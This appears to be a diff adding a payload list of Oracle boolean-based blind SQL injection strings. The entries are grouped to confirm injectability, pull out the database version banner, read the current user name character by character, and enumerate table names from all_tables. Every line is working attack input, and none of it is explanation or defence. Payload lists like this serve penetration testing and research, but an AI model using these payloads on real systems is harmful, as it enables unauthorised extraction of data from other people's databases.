@@ -1,0 +1,21 @@
+# Oracle — Boolean Blind Payloads
+
+# --- Confirm boolean ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND 1=1 FROM DUAL--
+
+# --- Version ---
+' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,6)='Oracle'--
+' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))=79--
+
+# --- User ---
+' AND SUBSTR(user,1,1)='A'--
+' AND ASCII(SUBSTR(user,1,1))>64--
+' AND LENGTH(user)=3--
+
+# --- Table enumeration ---
+' AND SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1)='U'--
+' AND ASCII(SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM=1),1,1))>84--
